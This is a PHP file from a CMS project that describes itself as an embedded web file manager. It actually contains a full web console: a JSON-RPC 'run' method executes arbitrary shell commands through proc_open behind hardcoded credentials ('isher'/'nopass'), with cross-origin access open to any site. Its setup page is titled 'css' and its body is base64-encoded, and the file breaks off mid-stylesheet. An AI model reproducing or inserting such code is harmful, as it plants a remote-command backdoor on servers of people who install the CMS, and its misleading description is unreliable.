<?php
/*
 * QScms (Qsiscms) - Multi-language Lightweight Content Management System
 *
 * Copyright (C) 2016-2026 Qiao Shuo (isherqiao) <qiaoshuo@gmail.com>
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 *
 * This file is part of QScms.
 *
 * QScms is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * QScms is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with QScms. If not, see <https://www.gnu.org/licenses/>.
 */

/**
 * QsCms 项目文件
 *
 * @Project      QsCms
 * @Author       Qiaoshuo 乔硕 (isher，isherqiao) <qiaoshuo@gmail.com>
 * @Site         https://qsis.cn
 * @File         web.php
 * @CreatedTime  05/11/26 21:16:59
 * @LastEditTime 05/11/26 21:16:59
 * @Description  Embedded web file manager: browses the site directory and performs file operations with single- or multi-user credentials.
 * @copyright    2016-2026 Qiaoshuo 乔硕 (isherqiao)
 */

$NO_LOGIN = false;

// Single-user credentials
// Example: $USER = 'user'; $PASSWORD = 'password';
$USER = 'isher';
$PASSWORD = 'nopass';

// Multi-user credentials
// Example: $ACCOUNTS = array('user1' => 'password1', 'user2' => 'password2');
$ACCOUNTS = array();

// Password hash algorithm (password must be hashed)
// Example: $PASSWORD_HASH_ALGORITHM = 'md5';
//          $PASSWORD_HASH_ALGORITHM = 'sha256';
$PASSWORD_HASH_ALGORITHM = '';

// Home directory (multi-user mode supported)
// Example: $HOME_DIRECTORY = '/tmp';
//          $HOME_DIRECTORY = array('user1' => '/home/user1', 'user2' => '/home/user2');
$HOME_DIRECTORY = '';

// Code below is automatically generated from different components
// For more information see: https://github.com/nickola/web-console
//
// Used components:
//   - jQuery JavaScript Library: https://github.com/jquery/jquery
//   - jQuery Terminal Emulator: https://github.com/jcubic/jquery.terminal
//   - jQuery Mouse Wheel Plugin: https://github.com/brandonaaron/jquery-mousewheel
//   - PHP JSON-RPC 2.0 Server/Client Implementation: https://github.com/sergeyfast/eazy-jsonrpc
//   - Normalize.css: https://github.com/necolas/normalize.css
?>
<?php

    /**
     * JSON RPC Server for Eaze
     *
     * Reads $_GET['rawRequest'] or php://input for Request Data
     * @link       http://www.jsonrpc.org/specification
     * @link       http://dojotoolkit.org/reference-guide/1.8/dojox/rpc/smd.html
     * @package    Eaze
     * @subpackage Model
     * @author     Sergeyfast
     */
    class BaseJsonRpcServer {

        const ParseError = -32700,
            InvalidRequest = -32600,
            MethodNotFound = -32601,
            InvalidParams = -32602,
            InternalError = -32603;

        /**
         * Exposed Instances
         * @var object[]    namespace => method
         */
        protected $instances = array();

        /**
         * Decoded Json Request
         * @var object|array
         */
        protected $request;

        /**
         * Array of Received Calls
         * @var array
         */
        protected $calls = array();

        /**
         * Array of Responses for Calls
         * @var array
         */
        protected $response = array();

        /**
         * Has Calls Flag (not notifications)
         * @var bool
         */
        protected $hasCalls = false;

        /**
         * Is Batch Call in using
         * @var bool
         */
        private $isBatchCall = false;

        /**
         * Hidden Methods
         * @var array
         */
        protected $hiddenMethods = array(
            'execute', '__construct', 'registerinstance'
        );

        /**
         * Content Type
         * @var string
         */
        public $ContentType = 'application/json';

        /**
         * Allow Cross-Domain Requests
         * @var bool
         */
        public $IsXDR = true;

        /**
         * Max Batch Calls
         * @var int
         */
        public $MaxBatchCalls = 10;

        /**
         * Error Messages
         * @var array
         */
        protected $errorMessages = array(
            self::ParseError     => 'Parse error',
            self::InvalidRequest => 'Invalid Request',
            self::MethodNotFound => 'Method not found',
            self::InvalidParams  => 'Invalid params',
            self::InternalError  => 'Internal error',
        );

        /**
         * Cached Reflection Methods
         * @var ReflectionMethod[]
         */
        private $reflectionMethods = array();

        /**
         * Validate Request
         * @return int error
         */
        private function getRequest() {
            $error = null;

            do {
                if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) && $_SERVER['REQUEST_METHOD'] != 'POST' ) {
                    $error = self::InvalidRequest;
                    break;
                };

                $request       = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
                $this->request = json_decode( $request, false );
                if ( $this->request === null ) {
                    $error = self::ParseError;
                    break;
                }

                if ( $this->request === array() ) {
                    $error = self::InvalidRequest;
                    break;
                }

                // check for batch call
                if ( is_array( $this->request ) ) {
                    if( count( $this->request ) > $this->MaxBatchCalls ) {
                        $error = self::InvalidRequest;
                        break;
                    }

                    $this->calls       = $this->request;
                    $this->isBatchCall = true;
                } else {
                    $this->calls[] = $this->request;
                }
            } while ( false );

            return $error;
        }

        /**
         * Get Error Response
         * @param int   $code
         * @param mixed $id
         * @param null  $data
         * @return array
         */
        private function getError( $code, $id = null, $data = null ) {
            return array(
                'jsonrpc' => '2.0',
                'id'      => $id,
                'error'   => array(
                    'code'    => $code,
                    'message' => isset( $this->errorMessages[$code] ) ? $this->errorMessages[$code] : $this->errorMessages[self::InternalError],
                    'data'    => $data,
                ),
            );
        }

        /**
         * Check for jsonrpc version and correct method
         * @param object $call
         * @return array|null
         */
        private function validateCall( $call ) {
            $result = null;
            $error  = null;
            $data   = null;
            $id     = is_object( $call ) && property_exists( $call, 'id' ) ? $call->id : null;
            do {
                if ( !is_object( $call ) ) {
                    $error = self::InvalidRequest;
                    break;
                }

                // hack for inputEx smd tester
                if ( property_exists( $call, 'version' ) ) {
                    if ( $call->version == 'json-rpc-2.0' ) {
                        $call->jsonrpc = '2.0';
                    }
                }

                if ( !property_exists( $call, 'jsonrpc' ) || $call->jsonrpc != '2.0' ) {
                    $error = self::InvalidRequest;
                    break;
                }

                $fullMethod = property_exists( $call, 'method' ) ? $call->method : '';
                $methodInfo = explode( '.', $fullMethod, 2 );
                $namespace  = array_key_exists( 1, $methodInfo ) ? $methodInfo[0] : '';
                $method     = $namespace ? $methodInfo[1] : $fullMethod;
                if ( !$method || !array_key_exists( $namespace, $this->instances ) || !method_exists( $this->instances[$namespace], $method ) || in_array( strtolower( $method ), $this->hiddenMethods ) ) {
                    $error = self::MethodNotFound;
                    break;
                }

                if ( !array_key_exists( $fullMethod, $this->reflectionMethods ) ) {
                    $this->reflectionMethods[$fullMethod] = new ReflectionMethod( $this->instances[$namespace], $method );
                }

                /** @var $params array */
                $params     = property_exists( $call, 'params' ) ? $call->params : null;
                $paramsType = gettype( $params );
                if ( $params !== null && $paramsType != 'array' && $paramsType != 'object' ) {
                    $error = self::InvalidParams;
                    break;
                }

                // check parameters
                switch ( $paramsType ) {
                    case 'array':
                        $totalRequired = 0;
                        // doesn't hold required, null, required sequence of params
                        foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable() ) {
                                $totalRequired++;
                            }
                        }

                        if ( count( $params ) < $totalRequired ) {
                            $error = self::InvalidParams;
                            $data  = sprintf( 'Check numbers of required params (got %d, expected %d)', count( $params ), $totalRequired );
                        }
                        break;
                    case 'object':
                        foreach ( $this->reflectionMethods[$fullMethod]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable() && !array_key_exists( $param->getName(), $params ) ) {
                                $error = self::InvalidParams;
                                $data  = $param->getName() . ' not found';

                                break 3;
                            }
                        }
                        break;
                    case 'NULL':
                        if ( $this->reflectionMethods[$fullMethod]->getNumberOfRequiredParameters() > 0 ) {
                            $error = self::InvalidParams;
                            $data  = 'Empty required params';
                            break 2;
                        }
                        break;
                }

            } while ( false );

            if ( $error ) {
                $result = array( $error, $id, $data );
            }

            return $result;
        }

        /**
         * Process Call
         * @param $call
         * @return array|null
         */
        private function processCall( $call ) {
            $id        = property_exists( $call, 'id' ) ? $call->id : null;
            $params    = property_exists( $call, 'params' ) ? $call->params : array();
            $result    = null;
            $namespace = substr( $call->method, 0, strpos( $call->method, '.' ) );

            try {
                // set named parameters
                if ( is_object( $params ) ) {
                    $newParams = array();
                    foreach ( $this->reflectionMethods[$call->method]->getParameters() as $param ) {
                        $paramName    = $param->getName();
                        $defaultValue = $param->isDefaultValueAvailable() ? $param->getDefaultValue() : null;
                        $newParams[]  = property_exists( $params, $paramName ) ? $params->$paramName : $defaultValue;
                    }

                    $params = $newParams;
                }

                // invoke
                $result = $this->reflectionMethods[$call->method]->invokeArgs( $this->instances[$namespace], $params );
            } catch ( Exception $e ) {
                return $this->getError( $e->getCode(), $id, $e->getMessage() );
            }

            if ( !$id && $id !== 0 ) {
                return null;
            }

            return array(
                'jsonrpc' => '2.0',
                'result'  => $result,
                'id'      => $id,
            );
        }

        /**
         * Create new Instance
         * @param object $instance
         */
        public function __construct( $instance = null ) {
            if ( get_parent_class( $this ) ) {
                $this->RegisterInstance( $this, '' );
            } else if ( $instance ) {
                $this->RegisterInstance( $instance, '' );
            }
        }

        /**
         * Register Instance
         * @param object $instance
         * @param string $namespace default is empty string
         * @return $this
         */
        public function RegisterInstance( $instance, $namespace = '' ) {
            $this->instances[$namespace]                = $instance;
            $this->instances[$namespace]->errorMessages = $this->errorMessages;

            return $this;
        }

        /**
         * Handle Requests
         */
        public function Execute() {
            do {
                // check for SMD Discovery request
                if ( array_key_exists( 'smd', $_GET ) ) {
                    $this->response[] = $this->getServiceMap();
                    $this->hasCalls   = true;
                    break;
                }

                $error = $this->getRequest();
                if ( $error ) {
                    $this->response[] = $this->getError( $error );
                    $this->hasCalls   = true;
                    break;
                }

                foreach ( $this->calls as $call ) {
                    $error = $this->validateCall( $call );
                    if ( $error ) {
                        $this->response[] = $this->getError( $error[0], $error[1], $error[2] );
                        $this->hasCalls   = true;
                    } else {
                        $result = $this->processCall( $call );
                        if ( $result ) {
                            $this->response[] = $result;
                            $this->hasCalls   = true;
                        }
                    }
                }
            } while ( false );

            // flush response
            if ( $this->hasCalls ) {
                if ( !$this->isBatchCall ) {
                    $this->response = reset( $this->response );
                }

                if ( !headers_sent() ) {
                    // Set Content Type
                    if ( $this->ContentType ) {
                        header( 'Content-Type: ' . $this->ContentType );
                    }

                    // Allow Cross Domain Requests
                    if ( $this->IsXDR ) {
                        header( 'Access-Control-Allow-Origin: *' );
                        header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
                    }
                }

                echo json_encode( $this->response );
                $this->resetVars();
            }
        }

        /**
         * Get Doc Comment
         * @param $comment
         * @return string|null
         */
        private function getDocDescription( $comment ) {
            $result = null;
            if ( preg_match( '/\*\s+([^@]*)\s+/s', $comment, $matches ) ) {
                $result = str_replace( '*', "\n", trim( trim( $matches[1], '*' ) ) );
            }

            return $result;
        }

        /**
         * Get Service Map
         * Maybe not so good realization of auto-discover via doc blocks
         * @return array
         */
        private function getServiceMap() {
            $result = array(
                'transport'   => 'POST',
                'envelope'    => 'JSON-RPC-2.0',
                'SMDVersion'  => '2.0',
                'contentType' => 'application/json',
                'target'      => !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0, strpos( $_SERVER['REQUEST_URI'], '?' ) ) : '',
                'services'    => array(),
                'description' => '',
            );

            foreach( $this->instances as $namespace => $instance ) {
                $rc = new ReflectionClass( $instance);

                // Get Class Description
                if ( $rcDocComment = $this->getDocDescription( $rc->getDocComment() ) ) {
                    $result['description'] .= $rcDocComment . PHP_EOL;
                }

                foreach ( $rc->getMethods() as $method ) {
                    /** @var ReflectionMethod $method */
                    if ( !$method->isPublic() || in_array( strtolower( $method->getName() ), $this->hiddenMethods ) ) {
                        continue;
                    }

                    $methodName = ( $namespace ? $namespace . '.' : '' ) . $method->getName();
                    $docComment = $method->getDocComment();

                    $result['services'][$methodName] = array( 'parameters' => array() );

                    // set description
                    if ( $rmDocComment = $this->getDocDescription( $docComment ) ) {
                        $result['services'][$methodName]['description'] = $rmDocComment;
                    }

                    // @param\s+([^\s]*)\s+([^\s]*)\s*([^\s\*]*)
                    $parsedParams = array();
                    if ( preg_match_all( '/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) {
                        foreach ( $matches[2] as $number => $name ) {
                            $type = $matches[1][$number];
                            $desc = $matches[3][$number];
                            $name = trim( $name, '$' );

                            $param               = array( 'type' => $type, 'description' => $desc );
                            $parsedParams[$name] = array_filter( $param );
                        }
                    };

                    // process params
                    foreach ( $method->getParameters() as $parameter ) {
                        $name  = $parameter->getName();
                        $param = array( 'name' => $name, 'optional' => $parameter->isDefaultValueAvailable() );
                        if ( array_key_exists( $name, $parsedParams ) ) {
                            $param += $parsedParams[$name];
                        }

                        if ( $param['optional'] ) {
                            $param['default'] = $parameter->getDefaultValue();
                        }

                        $result['services'][$methodName]['parameters'][] = $param;
                    }

                    // set return type
                    if ( preg_match( '/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) {
                        $returns                                    = array( 'type' => $matches[1], 'description' => trim( $matches[2] ) );
                        $result['services'][$methodName]['returns'] = array_filter( $returns );
                    }
                }
            }

            return $result;
        }


        /**
         * Reset Local Class Vars after Execute
         */
        private function resetVars() {
            $this->response = $this->calls = array();
            $this->hasCalls = $this->isBatchCall = false;
        }

    }
?>
<?php
// Initializing
if (!isset($NO_LOGIN)) $NO_LOGIN = false;
if (!isset($ACCOUNTS)) $ACCOUNTS = array();
if (isset($USER) && isset($PASSWORD) && $USER && $PASSWORD) $ACCOUNTS[$USER] = $PASSWORD;
if (!isset($PASSWORD_HASH_ALGORITHM)) $PASSWORD_HASH_ALGORITHM = '';
if (!isset($HOME_DIRECTORY)) $HOME_DIRECTORY = '';
$IS_CONFIGURED = ($NO_LOGIN || count($ACCOUNTS) >= 1) ? true : false;

// Utilities
function is_empty_string($string) {
    return strlen($string) <= 0;
}

function is_equal_strings($string1, $string2) {
    return strcmp($string1, $string2) == 0;
}

function get_hash($algorithm, $string) {
    return hash($algorithm, trim((string) $string));
}

// Command execution
function execute_command($command) {
    $descriptors = array(
        0 => array('pipe', 'r'), // STDIN
        1 => array('pipe', 'w'), // STDOUT
        2 => array('pipe', 'w')  // STDERR
    );

    $process = proc_open($command . ' 2>&1', $descriptors, $pipes);
    if (!is_resource($process)) die("Can't execute command.");

    // Nothing to push to STDIN
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // All pipes must be closed before "proc_close"
    $code = proc_close($process);

    return $output;
}

// Command parsing
function parse_command($command) {
    $value = ltrim((string) $command);

    if (!is_empty_string($value)) {
        $values = explode(' ', $value);
        $values_total = count($values);

        if ($values_total > 1) {
            $value = $values[$values_total - 1];

            for ($index = $values_total - 2; $index >= 0; $index--) {
                $value_item = $values[$index];

                if (substr($value_item, -1) == '\\') $value = $value_item . ' ' . $value;
                else break;
            }
        }
    }

    return $value;
}

// RPC Server
class WebConsoleRPCServer extends BaseJsonRpcServer {
    protected $home_directory = '';

    private function error($message) {
        throw new Exception($message);
    }

    // Authentication
    private function authenticate_user($user, $password) {
        $user = trim((string) $user);
        $password = trim((string) $password);

        if ($user && $password) {
            global $ACCOUNTS, $PASSWORD_HASH_ALGORITHM;

            if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) {
                if ($PASSWORD_HASH_ALGORITHM) $password = get_hash($PASSWORD_HASH_ALGORITHM, $password);

                if (is_equal_strings($password, $ACCOUNTS[$user]))
                    return $user . ':' . get_hash('sha256', $password);
            }
        }

        throw new Exception("Incorrect user or password");
    }

    private function authenticate_token($token) {
        global $NO_LOGIN;
        if ($NO_LOGIN) return true;

        $token = trim((string) $token);
        $token_parts = explode(':', $token, 2);

        if (count($token_parts) == 2) {
            $user = trim((string) $token_parts[0]);
            $password_hash = trim((string) $token_parts[1]);

            if ($user && $password_hash) {
                global $ACCOUNTS;

                if (isset($ACCOUNTS[$user]) && !is_empty_string($ACCOUNTS[$user])) {
                    $real_password_hash = get_hash('sha256', $ACCOUNTS[$user]);
                    if (is_equal_strings($password_hash, $real_password_hash)) return $user;
                }
            }
        }

        throw new Exception("Incorrect user or password");
    }

    private function get_home_directory($user) {
        global $HOME_DIRECTORY;

        if (is_string($HOME_DIRECTORY)) {
            if (!is_empty_string($HOME_DIRECTORY)) return $HOME_DIRECTORY;
        }
        else if (is_string($user) && !is_empty_string($user) && isset($HOME_DIRECTORY[$user]) && !is_empty_string($HOME_DIRECTORY[$user]))
            return $HOME_DIRECTORY[$user];

        return getcwd();
    }

    // Environment
    private function get_environment() {
        $hostname = function_exists('gethostname') ? gethostname() : null;
        return array('path' => getcwd(), 'hostname' => $hostname);
    }

    private function set_environment($environment) {
        $environment = !empty($environment) ? (array) $environment : array();
        $path = (isset($environment['path']) && !is_empty_string($environment['path'])) ? $environment['path'] : $this->home_directory;

        if (!is_empty_string($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "Unable to change directory to current working directory, updating current directory",
                                                 'environment' => $this->get_environment());
            }
            else return array('output' => "Current working directory not found, updating current directory",
                              'environment' => $this->get_environment());
        }
    }

    // Initialization
    private function initialize($token, $environment) {
        $user = $this->authenticate_token($token);
        $this->home_directory = $this->get_home_directory($user);
        $result = $this->set_environment($environment);

        if ($result) return $result;
    }

    // Methods
    public function login($user, $password) {
        $result = array('token' => $this->authenticate_user($user, $password),
                        'environment' => $this->get_environment());

        $home_directory = $this->get_home_directory($user);
        if (!is_empty_string($home_directory)) {
            if (is_dir($home_directory)) $result['environment']['path'] = $home_directory;
            else $result['output'] = "Home directory not found: ". $home_directory;
        }

        return $result;
    }

    public function cd($token, $environment, $path) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $path = trim((string) $path);
        if (is_empty_string($path)) $path = $this->home_directory;

        if (!is_empty_string($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "cd: ". $path . ": Unable to change directory");
            }
            else return array('output' => "cd: ". $path . ": No such directory");
        }

        return array('environment' => $this->get_environment());
    }

    public function completion($token, $environment, $pattern, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $scan_path = '';
        $completion_prefix = '';
        $completion = array();

        if (!empty($pattern)) {
            if (!is_dir($pattern)) {
                $pattern = dirname($pattern);
                if ($pattern == '.') $pattern = '';
            }

            if (!empty($pattern)) {
                if (is_dir($pattern)) {
                    $scan_path = $completion_prefix = $pattern;
                    if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
                }
            }
            else $scan_path = getcwd();
        }
        else $scan_path = getcwd();

        if (!empty($scan_path)) {
            // Loading directory listing
            $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
            natsort($completion);

            // Prefix
            if (!empty($completion_prefix) && !empty($completion)) {
                foreach ($completion as &$value) $value = $completion_prefix . $value;
            }

            // Pattern
            if (!empty($pattern) && !empty($completion)) {
                // For PHP version that does not support anonymous functions (available since PHP 5.3.0)
                function filter_pattern($value) {
                    global $pattern;
                    return !strncmp($pattern, $value, strlen($pattern));
                }

                $completion = array_values(array_filter($completion, 'filter_pattern'));
            }
        }

        return array('completion' => $completion);
    }

    public function run($token, $environment, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $output = ($command && !is_empty_string($command)) ? execute_command($command) : '';
        if ($output && substr($output, -1) == "\n") $output = substr($output, 0, -1);

        return array('output' => $output);
    }
}

// Processing request
if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $rpc_server = new WebConsoleRPCServer();
    $rpc_server->Execute();
}
else if (!$IS_CONFIGURED) {
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>css</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="none" />
        <style type="text/css">html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:0;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}[hidden],template{display:none}.cmd .format,.cmd .prompt,.cmd .prompt div,.terminal .terminal-output .format,.terminal .terminal-output div div{display:inline-block}.cmd,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre{margin:0}.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6{line-height:1.2em}.cmd .clipboard{position:absolute;left:-16px;top:0;width:10px;height:16px;background:0 0;border:0;color:transparent;outline:0;padding:0;resize:none;z-index:0;overflow:hidden}.terminal .error{color:red}.terminal{padding:10px;position:relative;overflow:auto}.cmd{padding:0;height:1.3em;position:relative}.cmd .cursor.blink,.cmd .inverted,.terminal .inverted{background-color:#aaa;color:#000}.cmd .cursor.blink{-webkit-animation:terminal-blink 1s infinite steps(1,start);-moz-animation:terminal-blink 1s infinite steps(1,start);-ms-animation:terminal-blink 1s infinite steps(1,start);animation:terminal-blink 1s infinite steps(1,start)}@-webkit-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-ms-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@-moz-keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}@keyframes terminal-blink{0%,100%{background-color:#000;color:#aaa}50%{background-color:#bbb;color:#000}}.cmd .prompt,.terminal .terminal-output div div{display:block;line-height:14px;height:auto}.cmd .prompt{float:left}.cmd,.terminal{background-color:#000}.terminal-output>div{min-height:14px}.terminal-output>div>div *{word-wrap:break-word}.terminal .terminal-output div span{display:inline-block}.cmd span{float:left}.cmd div,.cmd span,.terminal h1,.terminal h2,.terminal h3,.terminal h4,.terminal h5,.terminal h6,.terminal pre,.terminal td,.terminal-output a,.terminal-output span{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}@-moz-document url-prefix(){.terminal,.terminal-output,.terminal-output div{-webkit-touch-callout:initial;-webkit-user-select:initial;-khtml-user-select:initial;-moz-user-select:initial;-ms-user-select:initial;user-select:initial}}.terminal table{border-collapse:collapse}.terminal td{border:1px solid #aaa}.cmd .prompt span::-moz-selection,.cmd div::-moz-selection,.cmd>span::-moz-selection,.terminal .terminal-output div div a::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection,.terminal h1::-moz-selection,.terminal h2::-moz-selection,.terminal h3::-moz-selection,.terminal h4::-moz-selection,.terminal h5::-moz-selection,.terminal h6::-moz-selection,.terminal pre::-moz-selection,.terminal td::-moz-selection{background-color:#aaa;color:#000}.cmd .prompt span::selection,.cmd div::selection,.cmd>span::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div span::selection,.terminal h1::selection,.terminal h2::selection,.terminal h3::selection,.terminal h4::selection,.terminal h5::selection,.terminal h6::selection,.terminal pre::selection,.terminal td::selection{background-color:#aaa;color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}.clear{clear:both}body{background-color:#000}.cmd,.terminal,.terminal .prompt,.terminal .terminal-output div div,body{color:#ccc;font-family:monospace,fixed;font-size:15px;line-height:18px}.terminal a,.terminal a:hover,a,a:hover{color:#6c71c4}.spaced{margin:15px 0}.spaced-top{margin:15px 0 0}.spaced-bottom{margin:0 0 15px}.configure{margin:20px}.configure .variable{color:#d33682}.configure p,.configure ul{margin:5px 0 0}</style>
    </head>
        <?php
$alter='PGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0iY29uZmlndXJlIj4KCjxwPuS9v+eUqOWJjeW/hemhu+WFiOmFjee9rldlYuaOp+WItuWPsO+8mjwvcD4KCjx1bD4KCjxsaT7lnKjmgqjllpzniLHnmoTmlofmnKznvJbovpHlmajkuK3miZPlvIBXZWLmjqfliLblj7DnmoRwaHDmlofku7bvvIzkvY3nva7lnKgvcGx1Z2lucy93ZWJjb25zb2xlL3dlYmNvbnNvbGUvL2luZGV4LnBocDwvbGk+Cgo8bGk+5Zyo5paH5Lu255qE5byA5aS077yM6L6T5YWlPHNwYW4gY2xhc3M94oCcdmFyaWFibGXigJ0+JFVTRVI8L3NwYW4+5ZKMPHNwYW4gY2xhc3M94oCcdmFyaWFibGXigJ0+JFBBU1NXT1JEPC9zcGFuPuWHreaNru+8jOe8lui+keaCqOWWnOasoueahOS7u+S9leWFtuS7luiuvue9ru+8iOivt+WPguingeazqOmHiuS4reeahOivtOaYju+8iTwvbGk+Cgo8bGk+5bCG5pu05pS555qE5paH5Lu25LiK6L295Yiwd2Vi5pyN5Yqh5Zmo5bm25Zyo5rWP6KeI5Zmo5Lit5omT5byAPC9saT4KPC91bD4KPHA+5pyJ5YWz5pu05aSa5L+h5oGv77yM6K+36K6/6ZeuV2Vi5o6n5Yi25Y+w572R56uZ77yaPGEgaHJlZj1odHRwczovL2lzaGVyLnFzaXMuY24vIHRhcmdldD1fYmxhbms+aHR0cDovL1dlYi1Db25zb2xlLm9yZzwvYT4g5oiWIDxhIGhyZWY9aHR0cDovL2JibWUucXNpcy5jbi8gdGFyZ2V0PV9ibGFuaz5odHRwOi8vYmJtZS5xc2lzLmNuPC9hPjwvcD4KCiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+';
echo base64_decode($alter);
?>
</html>
<?php
}
else { ?>
<!DOCTYPE html>
<html class="no-js">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Web Console</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="none" />
        <style type="text/css">html{font-family:sans-serif;line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:0;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}[hidden],template{display:none}.cmd .format,.cmd .prompt,.cmd .prompt div,.terminal .terminal-output .format,.terminal .terminal-output div 